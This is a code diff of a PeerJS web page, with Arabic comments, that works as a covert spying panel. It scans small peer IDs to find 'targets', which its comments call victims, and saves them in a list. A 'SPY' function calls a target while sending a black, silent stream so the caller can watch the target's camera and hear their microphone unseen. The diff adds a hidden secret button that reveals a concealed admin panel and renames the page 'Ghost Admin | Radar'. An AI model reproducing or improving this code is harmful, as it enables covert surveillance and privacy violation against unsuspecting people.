@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Control | Spy System</title>
+    <title>Ghost Admin | Radar</title>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', monospace; }
@@ -12,62 +12,62 @@
         /* شاشة الدخول */
         #loginScreen { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
         .card { border: 1px solid #0f0; padding: 20px; width: 90%; max-width: 400px; box-shadow: 0 0 15px #0f0; background: #050505; }
-        
         .my-id { font-size: 3rem; font-weight: bold; margin: 20px 0; color: white; text-shadow: 0 0 10px #0f0; }
-        
         input { width: 100%; padding: 15px; margin-bottom: 10px; background: #111; border: 1px solid #0f0; color: white; text-align: center; font-size: 1.2rem; }
-        
         button { width: 100%; padding: 15px; background: #003300; color: #0f0; border: 1px solid #0f0; cursor: pointer; font-weight: bold; font-size: 1rem; margin-top: 5px; }
         button:hover { background: #0f0; color: black; }
 
-        /* شاشة التحكم */
+        /* شاشة النظام */
         #mainInterface { display: none; height: 100%; flex-direction: column; }
-        
-        .top-bar { padding: 10px; border-bottom: 2px solid #0f0; display: flex; justify-content: space-between; align-items: center; background: #001100; }
-        
         .video-area { flex: 1; position: relative; display: flex; border-bottom: 2px solid #0f0; }
         .vid { flex: 1; border-right: 1px solid #0f0; position: relative; background: #111; }
         video { width: 100%; height: 100%; object-fit: cover; }
         .label { position: absolute; bottom: 5px; left: 5px; background: black; padding: 2px 5px; font-size: 0.8rem; }
 
-        /* قائمة المتصلين (Admin Panel) */
-        .admin-panel { height: 30%; background: #050505; padding: 10px; overflow-y: auto; border-top: 2px solid #0f0; }
+        /* === القائمة السرية (مخفية في البداية) === */
+        .admin-panel { 
+            height: 30%; background: #050505; padding: 10px; overflow-y: auto; 
+            border-top: 2px solid #0f0; display: none; /* مخفية */
+        }
         .user-row { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px dashed #333; align-items: center; }
-        .user-id { font-size: 1.2rem; font-weight: bold; }
-        
         .btn-spy { background: #300; color: red; border-color: red; padding: 5px 10px; font-size: 0.8rem; width: auto; }
-        .btn-spy:hover { background: red; color: white; }
 
-        /* زر الأدمن */
-        #adminToggle { position: fixed; bottom: 0; right: 0; width: 50px; height: 50px; z-index: 999; opacity: 0; }
+        /* === الزر السري === */
+        #secretBtn {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 30px;
+            height: 30px;
+            background: rgba(255, 0, 0, 0.3); /* أحمر شفاف لتعرف مكانه */
+            z-index: 9999;
+            cursor: pointer;
+        }
+        #secretBtn:hover { background: red; } /* عند وضع الماوس يصبح أحمر */
+
     </style>
 </head>
 <body>
 
-    <!-- 1. الشاشة الرئيسية -->
+    <!-- 1. شاشة الدخول -->
     <div id="loginScreen">
         <div class="card">
-            <h1>📡 NETWORK LOGIN</h1>
-            <p style="color:#777">MY ID:</p>
+            <h1>📡 SYSTEM LOGIN</h1>
+            <p style="color:#777">YOUR ID:</p>
             <div class="my-id" id="myIdDisplay">--</div>
             
-            <input type="number" id="targetId" placeholder="رقم الضحية (أدخل يدوياً)">
-            <button onclick="connectManual()">اتصال مباشر (Connect)</button>
-            <button onclick="autoScan()" style="background:#004444; color:#0ff; border-color:#0ff;">🔎 بحث تلقائي سريع</button>
+            <input type="number" id="targetId" placeholder="Target ID">
+            <button onclick="connectManual()">Connect</button>
+            <button onclick="autoScan()" style="background:#004444; color:#0ff; border-color:#0ff;">🔎 Auto Scan (10-99)</button>
         </div>
     </div>
 
-    <!-- 2. واجهة النظام -->
+    <!-- 2. الشاشة الرئيسية -->
     <div id="mainInterface">
-        <div class="top-bar">
-            <span>🔴 LIVE FEED</span>
-            <button onclick="location.reload()" style="width:auto; padding:5px 10px; background:red; color:white; border:none;">EXIT</button>
-        </div>
-
         <div class="video-area">
             <div class="vid">
                 <video id="localVideo" autoplay muted></video>
-                <div class="label">ME (Admin)</div>
+                <div class="label">ADMIN (ME)</div>
             </div>
             <div class="vid">
                 <video id="remoteVideo" autoplay></video>
@@ -75,17 +75,17 @@
             </div>
         </div>
 
-        <!-- قائمة المتصلين (تظهر دائماً للأدمن) -->
+        <!-- القائمة السرية -->
         <div class="admin-panel" id="adminPanel">
-            <h3 style="border-bottom:1px solid #0f0; margin-bottom:10px;">📋 DETECTED TARGETS</h3>
-            <div id="usersList">
-                <div style="color:#555; text-align:center; padding:10px;">No targets detected yet...</div>
-            </div>
+            <h3 style="border-bottom:1px solid #0f0; margin-bottom:10px;">📋 TARGETS LIST</h3>
+            <div id="usersList">No targets yet...</div>
         </div>
     </div>
 
+    <!-- الزر السري -->
+    <div id="secretBtn" onclick="toggleAdminPanel()"></div>
+
     <script>
-        // === 1. تحديد رقم صغير جداً (10-99) لتسهيل العثور ===
         const myId = Math.floor(Math.random() * (99 - 10 + 1) + 10).toString();
         document.getElementById('myIdDisplay').innerText = myId;
 
@@ -93,88 +93,60 @@
         let conn = null;
         let call = null;
         let localStream = null;
-        
-        // قائمة المتصلين المحفوظة
         let detectedHistory = JSON.parse(localStorage.getItem('targets') || "[]");
 
-        // === تشغيل الكاميرا فوراً ===
         navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream => {
             localStream = stream;
             document.getElementById('localVideo').srcObject = stream;
         });
 
-        // === أحداث PEERJS ===
         peer.on('open', id => console.log('My ID:', id));
-
-        // استقبال اتصال
-        peer.on('connection', c => {
-            conn = c;
-            saveUser(conn.peer); // حفظ الضحية فوراً
-            setupConnection();
-        });
-
-        // استقبال مكالمة فيديو
+        peer.on('connection', c => { conn = c; saveUser(conn.peer); setupConnection(); });
         peer.on('call', incomingCall => {
             incomingCall.answer(localStream);
             call = incomingCall;
             call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
-            saveUser(incomingCall.peer); // حفظ الضحية
+            saveUser(incomingCall.peer);
             enterSystem();
         });
 
-        peer.on('error', err => {
-            console.log("Error:", err.type);
-            // إذا فشل البحث التلقائي، جرب الرقم التالي
-            if(window.isScanning) scanNext();
-        });
-
-        // === الوظائف ===
+        // --- وظائف الزر السري ---
+        function toggleAdminPanel() {
+            let panel = document.getElementById('adminPanel');
+            if(panel.style.display === 'none' || panel.style.display === '') {
+                panel.style.display = 'block'; // إظهار
+            } else {
+                panel.style.display = 'none'; // إخفاء
+            }
+        }
 
         function connectManual() {
             let id = document.getElementById('targetId').value;
-            if(!id) return alert("أدخل رقم الضحية");
+            if(!id) return alert("Enter ID");
             initiateCall(id);
         }
 
-        // البحث التلقائي (الرادار)
         window.scanIndex = 10;
         window.isScanning = false;
-
         function autoScan() {
             window.isScanning = true;
-            document.querySelector('button[onclick="autoScan()"]').innerText = "جاري المسح... (انتظر)";
+            document.querySelector('button[onclick="autoScan()"]').innerText = "SCANNING...";
             scanNext();
         }
 
         function scanNext() {
             if(!window.isScanning) return;
-            if(window.scanIndex > 99) window.scanIndex = 10; // إعادة التدوير
-            
+            if(window.scanIndex > 99) window.scanIndex = 10;
             let target = window.scanIndex.toString();
             if(target === myId) { window.scanIndex++; return scanNext(); }
-
-            console.log("Scanning ID:", target);
             
-            // محاولة الاتصال الخفيف للتحقق من الوجود
             let testConn = peer.connect(target);
-            
             let found = false;
-            
             testConn.on('open', () => {
-                found = true;
-                window.isScanning = false;
-                saveUser(target);
-                initiateCall(target); // وجدنا شخص! اتصل به
+                found = true; window.isScanning = false;
+                saveUser(target); initiateCall(target);
             });
-
-            // ننتظر قليلاً ثم نجرب التالي إذا لم يرد
-            setTimeout(() => {
-                if(!found) {
-                    testConn.close();
-                    window.scanIndex++;
-                    scanNext();
-                }
-            }, 200); // سرعة المسح (200ms لكل رقم)
+            setTimeout(() => { if(!found) { testConn.close(); window.scanIndex++; scanNext(); } }, 200);
         }
 
         function initiateCall(id) {
@@ -187,10 +159,7 @@
             });
         }
 
-        function setupConnection() {
-            conn.on('data', data => console.log("Data:", data));
-            conn.on('close', () => alert("انقطع الاتصال"));
-        }
+        function setupConnection() { conn.on('close', () => alert("Disconnected")); }
 
         function enterSystem() {
             document.getElementById('loginScreen').style.display = 'none';
@@ -198,7 +167,6 @@
             renderUsers();
         }
 
-        // === نظام حفظ الضحايا (Admin List) ===
         function saveUser(id) {
             if(!detectedHistory.includes(id)) {
                 detectedHistory.push(id);
@@ -210,47 +178,35 @@
         function renderUsers() {
             let container = document.getElementById('usersList');
             if(detectedHistory.length === 0) return;
-            
             container.innerHTML = '';
             detectedHistory.forEach(id => {
                 let row = `
                     <div class="user-row">
-                        <span class="user-id">TARGET #${id}</span>
-                        <div>
-                            <button class="btn-spy" onclick="spyAction('${id}')">👁️ SPY</button>
-                            <button class="btn-spy" style="background:#003300; border-color:#0f0; color:#0f0" onclick="initiateCall('${id}')">📞 CALL</button>
-                        </div>
-                    </div>
-                `;
+                        <span style="font-weight:bold; font-size:1.2rem;">TARGET #${id}</span>
+                        <button class="btn-spy" onclick="spyAction('${id}')">👁️ SPY</button>
+                    </div>`;
                 container.innerHTML += row;
             });
         }
 
-        // === ميزة التجسس (شاشة سوداء) ===
         function spyAction(id) {
-            // إنشاء شاشة سوداء
             let canvas = document.createElement('canvas');
             canvas.width = 100; canvas.height = 100;
             let ctx = canvas.getContext('2d');
             ctx.fillStyle = "black"; ctx.fillRect(0,0,100,100);
             let blackStream = canvas.captureStream(25);
-            
-            // إضافة صوت صامت
             let audioCtx = new AudioContext();
             let dest = audioCtx.createMediaStreamDestination();
             blackStream.addTrack(dest.stream.getAudioTracks()[0]);
 
             call = peer.call(id, blackStream);
             call.on('stream', rs => {
-                document.getElementById('remoteVideo').srcObject = rs; // نرى الضحية
-                document.getElementById('localVideo').srcObject = blackStream; // نرى شاشتنا السوداء
+                document.getElementById('remoteVideo').srcObject = rs;
+                document.getElementById('localVideo').srcObject = blackStream;
                 enterSystem();
             });
         }
-
-        // تحميل القائمة عند البدء
         renderUsers();
-
     </script>
 </body>
 </html>
